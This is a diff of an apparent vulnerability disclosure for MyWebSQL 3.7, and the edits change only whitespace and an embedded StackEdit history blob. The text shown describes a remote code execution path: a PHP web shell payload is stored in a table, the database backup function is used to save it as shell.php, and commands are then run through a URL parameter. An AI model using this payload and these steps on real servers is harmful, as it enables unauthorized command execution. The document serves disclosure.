@@ -15,7 +15,7 @@ MyWebSQL version in 3.7 has remote code execution (RCE) vulnerability.
 MyWebSQL version in 3.7 has remote code execution (RCE) vulnerability after write a shell code in database and execute `Backup Database` function.
  
 ### Concept
-1. Create a test table (code) and write a shell code in this table.
+1. Create a test table (code) and write a shell code in this table. 
  **Shell code example**: `<?php system($_GET[cmd]); ?>`
 ![](./png/1.png)
 2. Execute `Backup Database` function and modify Backup filename as `shell.php`.
@@ -23,6 +23,6 @@ MyWebSQL version in 3.7 has remote code execution (RCE) vulnerability after writ
 3. Browse `(domain)/mywebsql/backups/shell.php?cmd=XXX`. For instance, `cmd=ipconfig` as below figure.
 ![](./png/3.png)
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE5MDA5MDgwMDgsLTE5MTcyOTM4ODcsMT
-EwMjQ0NzAxOF19
+eyJoaXN0b3J5IjpbMTIwOTQ0NTAxNiwtMTkwMDkwODAwOCwtMT
+kxNzI5Mzg4NywxMTAyNDQ3MDE4XX0=
 -->
